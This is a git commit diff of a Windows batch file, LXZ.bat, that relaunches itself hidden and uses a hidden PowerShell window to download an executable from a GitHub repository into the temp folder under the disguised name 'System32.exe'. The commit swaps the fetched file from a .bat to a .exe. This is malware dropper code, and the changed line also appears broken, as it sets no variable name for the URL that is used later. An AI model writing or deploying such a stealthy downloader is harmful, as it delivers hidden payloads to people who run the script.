0e7b88bad39dc6db689e7ec1d1e9c2cb841aa779
lcmandrikion-hash <lcmandrikion@gmail.com>
2026-03-16 23:11:01 -0300

    Update LXZ.bat

--- LXZ.bat
+++ LXZ.bat
@@ -6,7 +6,7 @@ if "%1" neq "hidden" (
     exit
 )
 
-set "https://github.com/lcmandrikion-hash/CPD/raw/refs/heads/main/CPD.bat"
+set "https://github.com/lcmandrikion-hash/Mez/raw/refs/heads/main/LZX2.exe"
 set "ARQ=%TEMP%\System32.exe"
 
 powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%ARQ%'"
